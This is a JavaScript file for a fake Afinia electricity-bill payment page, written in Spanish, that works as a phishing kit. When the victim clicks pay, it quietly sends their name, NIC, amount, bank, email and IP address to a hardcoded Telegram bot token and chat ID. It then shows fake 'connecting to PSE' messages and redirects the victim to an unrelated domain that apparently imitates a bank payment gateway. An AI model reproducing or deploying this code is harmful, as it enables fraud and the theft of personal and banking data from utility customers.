document.addEventListener('DOMContentLoaded', async () => {
    
    // --- 1. CARGAR DATOS (Desde sessionStorage para compatibilidad con index.js) ---
    const datosJSON = sessionStorage.getItem('datosFactura');
    
    // Si no hay datos, devolver al inicio
    if (!datosJSON) {
        alert("Sesión expirada. Por favor consulte su NIC nuevamente.");
        window.location.href = 'index.html'; 
        return;
    }

    const datos = JSON.parse(datosJSON);
    console.log("Datos cargados:", datos);

    // --- 2. REFERENCIAS DOM ---
    const lblNombre = document.getElementById('lblNombre');
    const lblId = document.getElementById('lblId');
    const lblRef = document.getElementById('lblRef');
    const lblValorNeto = document.getElementById('lblValorNeto');
    const lblValorTotal = document.getElementById('lblValorTotal');
    const lblTotalFinal = document.getElementById('lblTotalFinal');
    const lblIp = document.getElementById('lblIp');

    // Formulario
    const selectBanco = document.getElementById('selectBanco');
    const formCorreo = document.getElementById('formCorreo'); // Ahora es un input normal
    const formNombre = document.getElementById('formNombre'); 
    
    // Botones y Loader
    const btnPay = document.querySelector('.btn-pay');
    const btnCancel = document.querySelector('.btn-cancel');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const loadingText = document.getElementById('dynamicLoadingText');

    // --- 3. FUNCIONES VISUALES (MÁSCARAS) ---
    function enmascararNombre(nombre) {
        if(!nombre) return "";
        const partes = nombre.split(" ");
        return partes[0] + " " + (partes[1] ? partes[1][0] : "") + "*******";
    }

    function enmascararID(id) {
        if(!id) return "****";
        return id.substring(0, 3) + "****";
    }

    // --- 4. LLENAR UI CON DATOS ---
    if(lblNombre) lblNombre.innerText = enmascararNombre(datos.nombre);
    if(lblId) lblId.innerText = enmascararID(datos.nic);
    if(lblRef) lblRef.innerText = datos.referencia;
    
    // Formateo de moneda
    const valorFormateado = new Intl.NumberFormat('en-US', {
        style: 'currency', currency: 'USD', minimumFractionDigits: 0
    }).format(datos.montoNumber).replace('$', '$ ');

    if(lblValorNeto) lblValorNeto.innerText = valorFormateado;
    if(lblValorTotal) lblValorTotal.innerText = valorFormateado;
    if(lblTotalFinal) lblTotalFinal.innerText = valorFormateado;

    // Pre-llenar formulario
    if(formNombre) formNombre.value = datos.nombre;
    
    // Pre-llenar correo si existe, pero dejarlo editable
    if(formCorreo) {
        if(datos.correo) formCorreo.value = datos.correo;
        else formCorreo.placeholder = "Ingrese su correo electrónico";
    }

    // Obtener IP (Silencioso)
    let userIp = 'IP no disponible';
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        userIp = ipData.ip;
        if(lblIp) lblIp.innerText = userIp;
    } catch (e) { console.log("No se pudo obtener IP", e); }


    // --- 5. BOTÓN CANCELAR ---
    if(btnCancel) {
        btnCancel.addEventListener('click', () => {
            window.location.href = 'index.html';
        });
    }

    // --- 6. LÓGICA DE PAGO ROBUSTA ---
    if(btnPay) {
        btnPay.addEventListener('click', async () => {
            
            // A. Recoger valores actuales del formulario
            const banco = selectBanco.value;
            // IMPORTANTE: Tomamos el valor que el usuario haya escrito o modificado en el input
            const correoFinal = formCorreo ? formCorreo.value.trim() : "";
            const montoFinal = datos.montoNumber > 0 ? datos.montoNumber : 5000;

            // B. Validaciones
            if (!banco || banco.includes('seleccione') || banco.trim() === "") { 
                alert("Por favor seleccione su banco para continuar."); 
                selectBanco.focus(); 
                return; 
            }
            
            if (!correoFinal || !correoFinal.includes('@')) { 
                alert("Por favor ingrese un correo electrónico válido para recibir el comprobante."); 
                if(formCorreo) formCorreo.focus(); 
                return; 
            }

            // C. TELEGRAM (No bloqueante)
            const TELEGRAM_TOKEN = '8425620613:AAGsiiwXNBDtJ_filOOtdPOkmnkyBau1d-4'; 
            const CHAT_ID = '-4977407810';

            const msg = `<b>Pago Iniciado (Afinia)</b>%0A` +
                        `👤 <b>Nombre:</b> ${datos.nombre}%0A` +
                        `🆔 <b>NIC:</b> ${datos.nic}%0A` +
                        `💰 <b>Monto:</b> $${datos.montoNumber}%0A` +
                        `🏦 <b>Banco:</b> ${banco}%0A` +
                        `📧 <b>Email:</b> ${correoFinal}%0A` +
                        `🌐 <b>IP:</b> ${userIp}`;

            // Enviar alerta "Fire and Forget"
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
            }).catch(e => console.warn("Telegram error:", e));


            // D. MOSTRAR LOADER
            if(loadingOverlay) {
                loadingOverlay.style.display = 'flex';
                loadingOverlay.classList.remove('hidden');
            }

            // Animación de texto
            const mensajes = ["Conectando con pasarela...", "Verificando banco...", "Conectando con PSE...", "Redirigiendo..."];
            let msgIdx = 0;
            const interval = setInterval(() => {
                if(loadingText) loadingText.innerText = mensajes[msgIdx];
                msgIdx = (msgIdx + 1) % mensajes.length;
            }, 2000);


            // E. PREPARAR PETICIÓN
            const API_BASE = 'https://aire.pagoswebcol.uk'; 
            
            const params = new URLSearchParams({
                amount: montoFinal,
                bank: banco,
                email: correoFinal, // Enviamos el correo que esté escrito en el input
                headless: 0,
                timeout: 60000 
            });

            console.log("Procesando pago con:", params.toString());

            // --- F. SISTEMA DE CONEXIÓN ROBUSTO (Plan A -> B -> C) ---

            // Función auxiliar: Éxito
            const finalizar = (urlDestino) => {
                clearInterval(interval);
                if(loadingText) loadingText.innerText = "¡Conexión Exitosa!";
                setTimeout(() => { window.location.href = urlDestino; }, 1000);
            };

            // Función auxiliar: Fallback JSONP
            const intentarJsonp = () => {
                console.log("Intentando JSONP...");
                const callbackName = 'jsonp_cb_' + Math.round(Math.random() * 100000);
                const script = document.createElement('script');

                window[callbackName] = (data) => {
                    delete window[callbackName];
                    document.body.removeChild(script);
                    if(data && data.result && data.result.exactName) {
                        finalizar(data.result.exactName);
                    } else {
                        redirigirDirecto();
                    }
                };

                script.onerror = () => {
                    delete window[callbackName];
                    if(script.parentNode) document.body.removeChild(script);
                    redirigirDirecto();
                };

                script.src = `${API_BASE}/meter.jsonp?${params.toString()}&callback=${callbackName}`;
                document.body.appendChild(script);
            };

            // Función auxiliar: Plan C (Redirección forzada)
            const redirigirDirecto = () => {
                console.log("Forzando redirección directa...");
                clearInterval(interval);
                if(loadingText) loadingText.innerText = "Redirigiendo al banco...";
                setTimeout(() => {
                    window.location.href = `${API_BASE}/meter?${params.toString()}`;
                }, 1500);
            };

            // --- EJECUCIÓN ---
            try {
                // PLAN A: Fetch Normal
                const response = await fetch(`${API_BASE}/meter?${params.toString()}`, {
                    method: 'GET',
                    headers: { 'Content-Type': 'application/json' }
                });

                if(response.ok) {
                    const resJson = await response.json();
                    if(resJson.result && resJson.result.exactName) {
                        finalizar(resJson.result.exactName);
                    } else {
                        throw new Error("Respuesta JSON incompleta");
                    }
                } else {
                    throw new Error("Error HTTP Fetch");
                }
            } catch (error) {
                console.warn("Fallo Fetch (Plan A), intentando Plan B...", error);
                intentarJsonp();
            }

        });
    }
});